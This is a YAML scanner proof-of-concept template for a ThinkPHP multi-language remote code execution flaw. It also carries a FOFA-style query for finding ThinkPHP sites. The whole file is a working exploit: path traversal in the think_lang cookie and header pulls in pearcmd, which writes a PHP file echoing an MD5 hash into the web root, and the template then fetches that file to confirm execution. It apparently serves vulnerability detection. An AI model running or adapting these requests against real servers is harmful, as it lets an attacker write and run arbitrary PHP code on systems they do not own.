expression: (r0() || r1()) && r2()
id: thinkphp-lang-rce
info:
  author: 7eleven
  description: "thinkphp\u591A\u8BED\u8A00\u6A21\u5757\u5B58\u5728Rce\u6F0F\u6D1E\n\
    app=\"Thinkphp\"\n"
  name: thinkphpRce
  severity: high
payloads:
  payloads:
    parm1: '"?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?="

      '
    parm2: '"?+config-create+/<?="

      '
rules:
  r0:
    expression: response.status == 200
    request:
      headers:
        Cookie: think_lang=../../../../../../../../usr/local/lib/php/pearcmd
        think-lang: ../../../../../../../../usr/local/lib/php/pearcmd
      method: GET
      path: /{{parm1}}md5({{n1}});?>+/var/www/html/{{n1}}.php
  r1:
    expression: response.status == 200
    request:
      headers:
        Cookie: think_lang=../../../../../../../../usr/local/lib/php/pearcmd
        think-lang: ../../../../../../../../usr/local/lib/php/pearcmd
      method: GET
      path: /{{parm2}}md5({{n1}});?>+/var/www/html/{{n1}}.php
  r2:
    expression: response.body.bcontains(bytes(md5(string(n1))))
    request:
      method: GET
      path: ^{{n1}}.php
set:
  n1: randomInt(800000000, 1000000000)
